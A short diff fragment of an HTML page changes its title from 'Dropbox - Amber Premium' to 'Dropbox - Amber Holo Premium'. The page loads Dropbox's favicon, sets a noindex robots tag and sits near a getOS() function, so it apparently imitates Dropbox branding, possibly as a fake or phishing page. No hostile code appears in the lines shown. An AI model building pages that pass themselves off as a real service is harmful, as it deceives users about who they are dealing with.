@@ -95,7 +95,7 @@ function getOS() {
 <html lang="en" class=""><head>
 
   <meta charset="UTF-8">
-  <title>Dropbox - Amber Premium </title>
+  <title>Dropbox - Amber Holo Premium </title>
   <link rel="icon" href="https://cfl.dropboxstatic.com/static/metaserver/static/images/favicon-vfl8lUR9B.ico" type="image/x-icon">
   <meta name="robots" content="noindex">
 
